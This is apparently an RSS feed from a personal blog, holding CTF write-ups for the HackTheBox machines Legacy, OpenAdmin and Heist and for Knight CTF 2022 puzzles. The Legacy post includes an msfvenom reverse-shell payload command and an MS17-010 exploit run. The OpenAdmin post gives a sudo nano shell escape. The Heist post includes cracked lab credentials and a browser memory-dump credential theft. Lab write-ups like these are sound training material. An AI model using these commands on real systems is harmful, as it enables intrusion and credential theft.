@@ -1,0 +1,303 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on Bryan Theuri </title>
+        <link>https://Or0ch1.github.io/posts/</link>
+        <description>Recent content in Posts on Bryan Theuri </description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
+        <lastBuildDate>Thu, 22 Sep 2022 16:35:24 +0300</lastBuildDate>
+        <atom:link href="https://Or0ch1.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Legacy</title>
+            <link>https://Or0ch1.github.io/posts/legacy/</link>
+            <pubDate>Thu, 22 Sep 2022 16:35:24 +0300</pubDate>
+            
+            <guid>https://Or0ch1.github.io/posts/legacy/</guid>
+            <description>Welcome to another HackTheBox writeup, today we&amp;rsquo;ll be diving into the retired windows box Legacy.
+Lets jump right in!
+Recon Starting the box we get the ip 10.10.10.4 and we scan for open ports using nmap.
+The results show the OS as Windows XP and the following ports open:
+ 135 - msrpc 139 - netbios-ssn 445 - microsoft-ds  Enumeration I try Null authentication by using smbclient and smbmap but I wasn&amp;rsquo;t successful.</description>
+            <content type="html"><![CDATA[<p>Welcome to another HackTheBox writeup, today we&rsquo;ll be diving into the retired windows box Legacy.</p>
+<p>Lets jump right in!</p>
+<h2 id="recon">Recon</h2>
+<p>Starting the box we get the ip <strong>10.10.10.4</strong> and we scan for open ports using nmap.</p>
+<p><img src="https://Or0ch1.github.io/Legacy/nmapscan.png" alt="nmap"></p>
+<p>The results show the OS as Windows XP and the following ports open:</p>
+<ul>
+<li>135 - msrpc</li>
+<li>139 - netbios-ssn</li>
+<li>445 - microsoft-ds</li>
+</ul>
+<h2 id="enumeration">Enumeration</h2>
+<p>I try Null authentication by using smbclient and smbmap but I wasn&rsquo;t successful.</p>
+<p><img src="https://Or0ch1.github.io/Legacy/smbclient.png" alt="smbclient"></p>
+<p>I decide to run nmap smb-vuln scipts to check for any smb vulnerabilities.</p>
+<p><img src="https://Or0ch1.github.io/Legacy/nmapscriptsearch.png" alt="nmap_scripts"></p>
+<p><img src="https://Or0ch1.github.io/Legacy/smbvuln.png" alt="vulns"></p>
+<p>The results show that there are two vulnerabilites present:</p>
+<ul>
+<li>MS08-067</li>
+<li>MS17-010</li>
+</ul>
+<p>While both of these vulns can be exploited via metasploit I decided not to use it.</p>
+<p>I tried exploiting both of them however i ran into problems with the <strong>MS08-067</strong> exploit, when I get a workaround the blog will be updated to include it.</p>
+<h2 id="ms17-010-exploitiation">MS17-010 Exploitiation</h2>
+<p>For this we are going to generate an exploit using msfvenom and use the following <a href="https://github.com/helviojunior/MS17-010">EXPLOIT</a>.</p>
+<p>I generated the msfvenom payload with the following options:</p>
+<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.6 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o exploit.exe</code></p>
+<ul>
+<li><code>-p</code> - to specify the platform as <strong>windows/shell_reverse_tcp</strong>.</li>
+<li><code>LHOST</code> - to specify the attackers IP address, since we&rsquo;re connecting via openvpn run <strong>ip a</strong> in the terminal and copy the address you see on the <strong>tun0</strong> interface.</li>
+<li><code>LPORT</code> - to indicate the port we will be listening on.</li>
+<li><code>EXITFUNC</code>  - specifies a DLL and function to call when the payload is complete, I set this as <strong>thread</strong> since we want a clean exit.</li>
+<li><code>-f</code> - format in which the payload will be generated.</li>
+<li><code>-a</code> and <code>--platform</code> - the architecture and platform of the target.</li>
+<li><code>-o</code> - outputfile.</li>
+</ul>
+<p>I set up a netcat listener on port 443 and from the repo cloned above I use <code>send_and_execute.py</code> with the following options.</p>
+<p><code>python2 send_and_execute.py 10.10.10.4 ~/HackTheBox/Legacy/exploit.exe</code></p>
+<p><img src="https://Or0ch1.github.io/Legacy/ms17_shell.png" alt="shell"></p>
+<p>We get a shell however since the OS is windows XP we do not have the whoami command or binary present, we have to upload it to the box.</p>
+<p>Kali linux has a folder containing windows binaries and checking in it we find the whoami.exe binary, I use impacket-smbclient to setup a share and I access the binary from the box.</p>
+<p><img src="https://Or0ch1.github.io/Legacy/whoami.png" alt="whoami"></p>
+<p>Since we are already <code>NT AUTHORITY/SYSTEM</code> theres no need for us to escalate privileges and I move to locating the flags.</p>
+<p>On windows one can search for a file using the following syntax <code>dir &lt;filename&gt; /s</code> so to search to find the flag I cd into <strong>C:</strong> and execute the search from here.</p>
+<p>The user flag is in the user johns Desktop folder while the root flag is in the Administrators Desktop folder.</p>
+<p><strong>user flag</strong>
+<img src="https://Or0ch1.github.io/Legacy/userflag.png" alt="userflag"></p>
+<p><strong>root flag</strong>
+<img src="https://Or0ch1.github.io/Legacy/rootflag.png" alt="rootflag"></p>
+<p>And we are done, this box was fairly simple and i enjoyed doing it.</p>
+<p>I hope someone succeeds on exploiting <strong>MS08-067</strong> on this box.</p>
+<p>Happy hacking everyone 😎 and as we say at f334aks-mini #IWDWD 💀</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>OpenAdmin</title>
+            <link>https://Or0ch1.github.io/posts/openadmin/</link>
+            <pubDate>Mon, 19 Sep 2022 08:48:53 +0300</pubDate>
+            
+            <guid>https://Or0ch1.github.io/posts/openadmin/</guid>
+            <description>Welcome to another Hack the Box writeup today we will be doing OpenAdmin.
+OpenAdmin is a retired Linux box which has been rated easy and is part of the intro to dante Track.
+Lets jump right in!
+Recon After starting the box we get the ip as 10.10.10.171 and as always I start with nmap to scan for open ports and services running on them.
+As we can see from the results we have two ports open, port 80 for HTTP and port 22 for ssh.</description>
+            <content type="html"><![CDATA[<p>Welcome to another Hack the Box writeup today we will be doing OpenAdmin.</p>
+<p>OpenAdmin is a retired Linux box which has been rated easy and is part of the <strong>intro to dante</strong> Track.</p>
+<p>Lets jump right in!</p>
+<h2 id="recon">Recon</h2>
+<p>After starting the box we get the ip as <strong>10.10.10.171</strong> and as always I start with nmap to scan for open ports and services running on them.</p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/nmapscan.png" alt="Nmap_results"></p>
+<p>As we can see from the results we have two ports open, port <strong>80</strong> for HTTP and port <strong>22</strong> for ssh.</p>
+<h2 id="web-enumeration">Web Enumeration</h2>
+<p>Navigating to <strong>10.10.10.171:80</strong> displays the default Apache2 page, nothing of interest is present so I need further enumerate.</p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/ApacheUbuntu.png" alt="Apache2"></p>
+<p>The next step is to enumerate by bruteforcing directories, I prefer using gobuster however you can user any directory bruteforcing tools available like dirb,dirsearch or feroxbuster.</p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/gobuster.png" alt="Gobuster"></p>
+<p>The music endpoint looks interesting, I navigate to it and it has the banner <strong>Music | NOT LIVE/NOT FOR PRODUCTION USE</strong>, clicking on login redirects us to the endpoint <strong>10.10.10.171/ona/</strong> which has the banner <strong>OpenNetAdmin :: 0wn Your Network</strong>.</p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/music.png" alt="Music"></p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/ONA.png" alt="ONA"></p>
+<p>I am logged in as guest and notice an alert message stating that the version of OpenNetAdmin running is v18.1.1 which isn&rsquo;t the latest version.</p>
+<p>Searching on searchsploit we can see this version is vulnerable and has a few exploits available.</p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/searchsploit.png" alt="Searchsploit"></p>
+<p>Google also provided me with a few POCs, I cloned one of them and proceeded to execute it.</p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/google_results.png" alt="Google"></p>
+<p>We get a shell as <strong>www-data</strong> on the machine however its not pretty so i spawn a reverse shell and connect with netcat.</p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/shell.png" alt="Shell"></p>
+<p>Running <strong>ls</strong> shows us the <strong>ona</strong> site directory and a few others,I changed into the <strong>ona</strong> directory and started checking the config files in it which eventually led me to something juicy, a database settings php file containing credentials <strong>/var/www/html/ona/local/config/database_settings.inc.php</strong>.</p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/index_php.png" alt="ls"></p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/configcreds.png" alt="Creds"></p>
+<p>Next I enumerated users on the machine and found two <strong>joanna</strong> and <strong>jimmy</strong></p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/userenum.png" alt="Userenum"></p>
+<h2 id="ssh-as-jimmy">SSH as jimmy</h2>
+<p>Now that we have credentials and users, I try to ssh first as joanna which fails and then as jimmy which is succeeds.</p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/joannassh.png" alt="joanna"></p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/jimmyssh.png" alt="jimmy"></p>
+<p>Now that we have a shell as jimmy, navigating in the previous section while running <strong>ls</strong> I saw a directory named <strong>internal</strong> which I couldn&rsquo;t access as the user <strong>www-data</strong> however I can now access as the user <strong>jimmy</strong>.</p>
+<p>Listing the directories in <strong>internal</strong> reveals the following files and on checking <strong>main.php</strong> I get a hint on the user joanna.</p>
+<p>There was also an index.php file which contained a hash belonging to jimmy for the main.php page, which can be used to get the SSH key however I didn&rsquo;t use this method.</p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/index_php.png" alt="ls"></p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/main_php.png" alt="main"></p>
+<p>In order to get the SSH key, I needed to run curl on the main.php page and In order for this to work I needed to know the port that the page was using.</p>
+<p>To list the listening ports on this box I ran netstat -tulpn.</p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/portsrunning.png" alt="ports"></p>
+<p>I ran through each port until I got a hit which was port <strong>52846</strong>, I copied the SSH key to a file and used john to crack it.</p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/sshkey.png" alt="RSA"></p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/john.png" alt="John"></p>
+<h2 id="ssh-as-joanna">SSH as joanna</h2>
+<p>I then proceeded to ssh as joanna using the SSH key and the passphrase cracked by john, however I ran into a problem ssh was throwing an error stating that the permissions on the key file were too open.</p>
+<p>This stumped me for a bit but looking at the permissions on the file <strong>0644</strong> I decided to remove the group and global permissions on the file as this would probably be the obvious cause for the degraded security.</p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/joanna_change_permissions.png" alt="Changer_permissions"></p>
+<p>After this I was able to ssh successfully as joanna.</p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/joannassh_success.png" alt="Joannassh"></p>
+<h2 id="user-flag">User Flag</h2>
+<p>The user flag was easy to find, running <strong>ls</strong> showed me a <strong>user.txt</strong> file which contained the flag.</p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/userflag.png" alt="Userflag"></p>
+<h2 id="root-flag">Root Flag</h2>
+<p>This was a bit trickier to get, first I decided to check what root access joanna had and found that the nano tool could be ran with elevated privileges.</p>
+<p>Running linpeas would also have shown this.</p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/check_sudo.png" alt="Sudocheck"></p>
+<p>From here I had two methods I could use to read the <strong>root.txt</strong> file</p>
+<h3 id="method-1">Method 1</h3>
+<p>Checking GTFObins we get a method to get a shell using nano.</p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/gtfobins.png" alt="GTFO"></p>
+<p>So I open nano as sudo without specifying a file name then do a <strong>ctrl+r</strong> and <strong>ctrl+x</strong> allowing us to run a command then I type in <strong>reset; sh 1&gt;&amp;0 2&gt;&amp;0</strong>, after getting a shell we just need to cat the <strong>root.txt</strong> file and we get the root flag.</p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/flag_method1.png" alt="method1_flag"></p>
+<h3 id="method-2">Method 2</h3>
+<p>For this method we open the /opt/priv file using nano as sudo then try changing directories and it succeeds.</p>
+<p>So I do a <strong>ctrl+r</strong> which will allow me to insert a different file into the /opt/priv one and read the flag.</p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/method2_1.png" alt="method2_1"></p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/method2_2.png" alt="method2_2"></p>
+<p><img src="https://Or0ch1.github.io/OpenAdmin/method2_flag.png" alt="method2_flag"></p>
+<p>I had a lot of fun doing this box and writeup, I really hope you enjoyed the read.</p>
+<p>Happy hacking everyone 😎 and as we say at f334aks-mini #IWDWD 💀</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Heist</title>
+            <link>https://Or0ch1.github.io/posts/heist/</link>
+            <pubDate>Fri, 16 Sep 2022 20:17:27 +0300</pubDate>
+            
+            <guid>https://Or0ch1.github.io/posts/heist/</guid>
+            <description>This will be my dive into writeups on boxes from Hack The Box.
+Heist is a retired windows box which has been rated easy and is part of the intro to dante Track.
+Lets jump right in!
+Recon After starting the box we get the ip as 10.10.10.149 and as always I start with nmap to scan for open ports and services running on them.
+I ran into a few problems with Nmap so I rescanned the machine with rustscan which got me all the open ports.</description>
+            <content type="html"><![CDATA[<p>This will be my dive into writeups on boxes from Hack The Box.</p>
+<p>Heist is a retired windows box which has been rated easy and is part of the <strong>intro to dante</strong> Track.</p>
+<p>Lets jump right in!</p>
+<h2 id="recon">Recon</h2>
+<p>After starting the box we get the ip as <strong>10.10.10.149</strong> and as always I start with nmap to scan for open ports and services running on them.</p>
+<p><img src="https://Or0ch1.github.io/heist/nmapscan.png" alt="Nmap_results"></p>
+<p>I ran into a few problems with Nmap so I rescanned the machine with rustscan which got me all the open ports.</p>
+<p><img src="https://Or0ch1.github.io/heist/rustscan.png" alt="rustscan"></p>
+<h2 id="web-enumeration">Web Enumeration</h2>
+<p>Navigating to <strong>10.10.10.149:80</strong> we get a login page.</p>
+<p><img src="https://Or0ch1.github.io/heist/port80.png" alt="Login"></p>
+<p>Trying to login prompts us to enter an email address,I decide to try and log in as guest and we get something interesting.</p>
+<p>Instead of a login or registration page we&rsquo;re redirected to a support page containing a thread about someone named <strong>Hazard</strong> who has attached part of a cisco config file.</p>
+<p><img src="https://Or0ch1.github.io/heist/supportpage.png" alt="Guest_login"></p>
+<p>Clicking on the attachment opens it in the browser and we see password hashes and usernames.</p>
+<p><img src="https://Or0ch1.github.io/heist/cisco_config.png" alt="AttachmentFile"></p>
+<p>I use John the Ripper with the format set to <strong>md5crypt</strong> to crack the Type 5 password.</p>
+<p><img src="https://Or0ch1.github.io/heist/password5crack.png" alt="type5"></p>
+<p>For the type 7 password hashes I use a custom perl script to decrypt them.</p>
+<p><img src="https://Or0ch1.github.io/heist/password7crack.png" alt="type7"></p>
+<h2 id="smb-enumeration">Smb Enumeration</h2>
+<p>In the support thread <strong>Hazard</strong> asked the support admin to create an account for him on the server, so using the decrypted credentials I try to access the shares.</p>
+<p>Using <strong>Hazard: stealth1agent</strong> we are able to authenticate however, we are only able to list the shares and we can neither mount or access them.</p>
+<p><img src="https://Or0ch1.github.io/heist/smbshares.png" alt="smb_shares"></p>
+<p>Since we have rpc on the windows box I enumerate other users using impackets&rsquo; <strong>lookupsid</strong>.</p>
+<p><img src="https://Or0ch1.github.io/heist/enum_users.png" alt="enum_users"></p>
+<h2 id="winrm-enumeration">Winrm enumeration</h2>
+<p>Since we also have winrm,using evil-winrm I try and see which user and credential work, after a few tries im able to authenticate as <strong>chase : Q4)sJu\Y8qz*A3?d</strong> .</p>
+<p>Poking around I see two interesting files in the Desktop directory <strong>todo.txt</strong> and <strong>user.txt</strong>.</p>
+<p><strong>todo.txt</strong> contains some hints which we will use later.</p>
+<p><img src="https://Or0ch1.github.io/heist/evilwinrm_access.png" alt="evil_winrm"></p>
+<p><strong>user.txt</strong> contains the user flag hash which we submit.</p>
+<p><img src="https://Or0ch1.github.io/heist/userflag.png" alt="user_flag"></p>
+<p>Moving back to the <strong>todo.txt</strong> file we can see some list of things to do some of which are already done and some which aren&rsquo;t.</p>
+<p>We can see Chase needs to keep checking the issues list and supposed to fix a route config hence I come to the conclusion he is the support admin.</p>
+<p>He will be monitoring the issues list website via browser so I decide to check the processes running and I see firefox.</p>
+<p><img src="https://Or0ch1.github.io/heist/firefox_process.png" alt="firefox_process"></p>
+<p>I upload both procdump64.exe and strings64.exe from the sysinternals suite to the machine.</p>
+<p><img src="https://Or0ch1.github.io/heist/upload_procdump.png" alt="procdump"></p>
+<p><img src="https://Or0ch1.github.io/heist/upload_strings.png" alt="strings"></p>
+<p>Using procdump.exe I dump one of the firefox processes and extract strings from it to another file using strings64.exe.</p>
+<p><img src="https://Or0ch1.github.io/heist/dump_firefox.png" alt="dump_firefox"></p>
+<p><img src="https://Or0ch1.github.io/heist/dump_strings.png" alt="dump_strings"></p>
+<p>I then searched for the string <strong>login_password</strong> from the txt file and found a password.</p>
+<p><img src="https://Or0ch1.github.io/heist/admin_pass.png" alt="admin_pass"></p>
+<p>From the user enumeration we saw an administrator account,tying the credentials we&rsquo;ve gotten with it we are successful and on the desktop we find <strong>root.txt</strong> which contains the admin flag hash.</p>
+<p><img src="https://Or0ch1.github.io/heist/flaghash.png" alt=""></p>
+<p>I Submitted the hash and completed the box.</p>
+<p>You can get Sysinternals Suite <a href="https://live.sysinternals.com/">HERE</a></p>
+<p>I had a lot of fun doing this box and writeup, I really hope you enjoyed the read.</p>
+<p>Happy hacking everyone 😎 and as we say at f334aks-mini #IWDWD 💀</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Knight CTF 2022</title>
+            <link>https://Or0ch1.github.io/posts/knightctf2022/</link>
+            <pubDate>Wed, 02 Feb 2022 08:56:51 +0300</pubDate>
+            
+            <guid>https://Or0ch1.github.io/posts/knightctf2022/</guid>
+            <description>This was one of the CTFs that started off the year and it was an online jeopardy style Capture the Flag (CTF) competition hosted by the Knight Squad community from Bangladesh.
+The CTF started on 20 January 2022 09:00PM GMT +6 and ended on 21 January 2022 11:59PM GMT +6.
+I participated under team @Fr334aks-mini and we managed pos 120 out of 752 teams with 2750 points.
+I focused primarily on the forensic and steganography categories and managed to solve 4 challenges,2 from each category.</description>
+            <content type="html"><![CDATA[<p>This was one of the CTFs that started off the year and it was an online jeopardy style Capture the Flag (CTF) competition hosted by the Knight Squad community from Bangladesh.</p>
+<p>The CTF started on 20 January 2022 09:00PM GMT +6 and ended on 21 January 2022 11:59PM GMT +6.</p>
+<p>I participated under team <a href="https://twitter.com/fr334aksmini">@Fr334aks-mini</a> and we managed pos 120 out of 752 teams with 2750 points.</p>
+<p><img src="https://Or0ch1.github.io/knightctf/position.png" alt="Team_Position"></p>
+<p>I focused primarily on the forensic and steganography categories and managed to solve 4 challenges,2 from each category.</p>
+<h2 id="forensics">Forensics</h2>
+<h3 id="lets-walk-together">Lets walk Together</h3>
+<p>Find the flag from the following: <a href="https://drive.google.com/drive/folders/1wjBWBjz2e_DxgSNvD-j5vXoKahZiVfLR">Download Link</a>.</p>
+<p>First thing i always do whenever i get an image is to run file and strings on the image file in order to check that file extension matches the file type and to check to see if any hints appear from the strings in the file.
+In this case the output from strings showed a flag.txt hinting towards a file being embedded in the image.</p>
+<p><img src="https://Or0ch1.github.io/knightctf/forenchll4.png" alt="chall"></p>
+<p>I decided to use foremost to extract the file from the image and got a zip file.</p>
+<p><img src="https://Or0ch1.github.io/knightctf/foremost.png" alt="foremost"></p>
+<p><img src="https://Or0ch1.github.io/knightctf/lsout.png" alt="ls"></p>
+<p>Tried unzipping the file but it needed a password,i cracked it using fcrackzip and the rockyou.txt wordlist got the password and extracted the file and got the flag.</p>
+<p><img src="https://Or0ch1.github.io/knightctf/crack2.png" alt="crack"></p>
+<h2 id="unknown-file">Unknown File</h2>
+<p>Find the flag from the following: <a href="https://drive.google.com/drive/folders/1bNDZ_csIPx_hG0_ou1WgL884aEpMajSe">Download Link</a></p>
+<p>As i always do i ran file on the file and it ws identified as data. That stumped me for a while till i decided to view it in hexdump and noticed the file had IHDR and IEND chunks so i knew that it was an image.</p>
+<p><img src="https://Or0ch1.github.io/knightctf/IHDR.png" alt="ihdr">
+<img src="https://Or0ch1.github.io/knightctf/IEND.png" alt="iend"></p>
+<p>On investigating the IEND chunk further i noticed the end chunk value <strong>49 45 4E 44 AE 42 60 82</strong> was that of a png image.</p>
+<p><img src="https://Or0ch1.github.io/knightctf/iendhex.png" alt="iendhex"></p>
+<p>I researched a bit about fixing png headers and found this tool <a href="https://github.com/sherlly/PCRT.git">PCRT</a> that automatically fixes the headers.I added a png extension to the file and the tool automatically fixed it.</p>
+<p><img src="https://Or0ch1.github.io/knightctf/PCRT.png" alt="pcrt"></p>
+<p><img src="https://Or0ch1.github.io/knightctf/output2.png" alt="output2"></p>
+<h2 id="steganography">Steganography</h2>
+<h3 id="filed">FileD</h3>
+<p>Find the Flag from the following: <a href="https://drive.google.com/drive/folders/1tZi4QQhxGWJBIQB62-1zjU5jiGG97OQG">Download Link</a></p>
+<p>On downloading you get a file with a .kra extension,i have never seen such an extension before so i immediately googled about it and found this site <a href="https://fileinfo.com/extension/kra">KRA File</a> which explained that the file was an image created by the application Krita Image viewer.</p>
+<p>It is provided as an appimage, hence you just download it give it execution permissions and run it.</p>
+<p><img src="https://Or0ch1.github.io/knightctf/krita.png" alt="krita"></p>
+<p>Opening the image using the application showed the image itself and in a separate pane showed the layers that the image had.</p>
+<p><img src="https://Or0ch1.github.io/knightctf/layers.png" alt="layers"></p>
+<p>I went about deleting each layer till i got to the flag.</p>
+<p><img src="https://Or0ch1.github.io/knightctf/rightlayer.png" alt="rightlayers">
+<img src="https://Or0ch1.github.io/knightctf/flag.png" alt="flag"></p>
+<h3 id="follow-the-white-rabbit">Follow The White Rabbit</h3>
+<p>Find the Flag from the following: <a href="https://drive.google.com/drive/folders/1NSPLcRnbhdwYdaNttpvidJ2RiaPxk0rR">Download Link</a></p>
+<p>We get an image with a rabbit, however when you look at it closer you see a series of dashes and fullstops.</p>
+<p><img src="https://Or0ch1.github.io/knightctf/whiterabbit.jpg" alt="whiterabbit"></p>
+<p>I immediately knew it was morse code and went about decoding it with <a href="https://morsedecoder.com/">Morse Decoder</a>.</p>
+<p><img src="https://Or0ch1.github.io/knightctf/morse.png" alt="morse"></p>
+<p>The decoded text was to be placed in <strong>KCTF{}</strong> and submitted as the flag.</p>
+<h3 id="qr-code-from-the-future">QR Code From The Future</h3>
+<p>Challenge file can be found here: <a href="https://drive.google.com/drive/folders/1TDizwDbBhBR1bz9LYYqBrDL6cUtrMqEV">Download Link</a></p>
+<p>I did solve this challenge but not before the flag was submitted by the team captain Winter.</p>
+<p>This challenge really gve me a headache,it was a git that contained qrcodes.</p>
+<p>I ran strings,binwalk, foremost and all i hit were dead ends till i decided to stop thinking along the lines of &ldquo;There must be a file or text embedded in it&rdquo;.</p>
+<p>Since it was a gif but contained qrcode i decided to scan it but each and every time i scanned the qrcode i got a different letter which was when i realized these were multiple qrcodes in the gif.</p>
+<p>I researched a bit and found a site which extracted each frame and saved them as images in a zip making it easier to work with the qrcodes <a href="https://ezgif.com/split">EZgif</a>.</p>
+<p><img src="https://Or0ch1.github.io/knightctf/gif.png" alt="morse"></p>
+<p><img src="https://Or0ch1.github.io/knightctf/zip.png" alt="morse"></p>
+<p>I now had a new problem, i had 48 different images and i shuddered to think that i was going to have to manually load them into a qrcode scanner so i created 2 python scripts, one to decode the qrcodes in bulk and output the text and the second to format the text onto a single line.</p>
+<p>The scripts can be found on my github <a href="https://github.com/Or0ch1/Scripts">Or0ch1</a></p>
+<p><img src="https://Or0ch1.github.io/knightctf/pyscript.png" alt="morse"></p>
+<p>One huge problem i faced was how the program was reading the files randomly so for an hour i was stuck trying to decode text that was in the wrong order.I fixed this by using the nasorted python library.</p>
+<p>The text gotten was shifted using ROT13 and it was also reversed so i used this online decoder <a href="https://rot13.com/">ROT13</a> and got the flag.</p>
+<p><img src="https://Or0ch1.github.io/knightctf/Rot.png" alt="morse">
+<img src="https://Or0ch1.github.io/knightctf/code.png" alt="morse"></p>
+<p>I really hope you enjoyed the read, as im sure most can tell this is my first time writing a writeup 😂 but i hope to get better with time.</p>
+<p>Happy hacking everyone 😎 and as we say at f334aks-mini #IWDWD 💀</p>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
